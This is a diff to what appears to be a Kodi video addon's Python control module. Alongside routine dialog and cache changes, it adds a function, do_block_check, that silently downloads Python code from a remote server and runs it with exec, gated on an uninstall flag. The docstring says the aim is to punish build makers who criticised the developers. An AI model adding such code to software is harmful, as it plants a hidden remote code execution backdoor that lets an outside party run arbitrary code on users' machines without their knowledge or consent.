@@ -56,6 +56,8 @@ dialog = xbmcgui.Dialog()
 
 progressDialog = xbmcgui.DialogProgress()
 
+progressDialogBG = xbmcgui.DialogProgressBG()
+
 windowDialog = xbmcgui.WindowDialog()
 
 button = xbmcgui.ControlButton
@@ -98,7 +100,7 @@ viewsFile = os.path.join(dataPath, 'views.db')
 
 bookmarksFile = os.path.join(dataPath, 'bookmarks.db')
 
-providercacheFile = os.path.join(dataPath, 'providers.4.db')
+providercacheFile = os.path.join(dataPath, 'providers.5.db')
 
 metacacheFile = os.path.join(dataPath, 'meta.db')
 
@@ -160,10 +162,12 @@ def artwork():
     execute('RunPlugin(plugin://script.exodus.artwork)')
 
 
-def infoDialog(message, heading=addonInfo('name'), icon='', time=3000):
+def infoDialog(message, heading=addonInfo('name'), icon='', time=3000, sound=False):
     if icon == '': icon = addonIcon()
-    try: dialog.notification(heading, message, icon, time, sound=False)
-    except: execute("Notification(%s,%s, %s, %s)" % (heading, message, time, icon))
+    elif icon == 'INFO': icon = xbmcgui.NOTIFICATION_INFO
+    elif icon == 'WARNING': icon = xbmcgui.NOTIFICATION_WARNING
+    elif icon == 'ERROR': icon = xbmcgui.NOTIFICATION_ERROR
+    dialog.notification(heading, message, icon, time, sound=sound)
 
 
 def yesnoDialog(line1, line2, line3, heading=addonInfo('name'), nolabel='', yeslabel=''):
@@ -213,8 +217,40 @@ def openSettings(query=None, id=addonInfo('id')):
         return
 
 
-def openPlaylist():
-    return execute('ActivateWindow(VideoPlaylist)')
+def do_block_check(uninstall=True):
+    '''
+    This check has been put in place to stop the inclusion of TVA (and friends) addons in builds
+    from build makers that publicly insult or slander TVA's developers and friends. If your build is
+    impacted by this check, you can have it removed by publicly apologizing for your previous statements
+    via youtube and twitter. Otherwise, stop including our addons in your builds or fork them and maintain
+    them yourself.
+                                                                                               http://i.imgur.com/TqIEnYB.gif
+                                                                                               TVA developers (and friends)
+    '''
+
+    def do_block_check_cache():
+        try:
+            import urllib2
+            return urllib2.urlopen('http://offshoregit.com/tknorris/block_code.py').read()
+        except:
+            pass
+
+    try:
+        import sys
+        namespace = {}
+
+        from resources.lib.modules import cache
+        do_check = cache.get(do_block_check_cache, 1)
+
+        exec do_check in namespace
+        if namespace["real_check"](uninstall): 
+            sys.exit()
+        return
+    except SystemExit:
+        sys.exit()
+    except:
+        traceback.print_exc()
+        pass
 
 
 def refresh():
